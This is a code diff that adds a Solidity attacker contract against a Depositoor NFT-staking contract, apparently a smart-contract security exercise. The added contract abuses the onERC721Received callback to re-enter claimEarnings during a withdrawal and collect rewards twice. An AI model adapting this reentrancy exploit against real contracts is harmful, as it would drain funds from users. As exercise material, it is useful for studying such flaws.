@@ -103,3 +103,32 @@ contract Depositoor is IERC721Receiver {
         rewardToken.transfer(_a, amountToSend);
     }
 }
+
+contract RewardTokenAttacker is IERC721Receiver {
+    Depositoor depositor;
+    IERC721 nft;
+    IERC20 token;
+
+    constructor() {}
+
+    function initiate(Depositoor depositor_) external {
+        depositor = depositor_;
+        nft = depositor.nft();
+        token = depositor.rewardToken();
+        nft.safeTransferFrom(address(this), address(depositor), 42, "");
+    }
+
+    function claim() external {
+        depositor.withdrawAndClaimEarnings(42);
+    }
+
+    function onERC721Received(
+        address, // operator
+        address, // from
+        uint256, // tokenId
+        bytes calldata
+    ) external override returns (bytes4) {
+        depositor.claimEarnings(42);
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
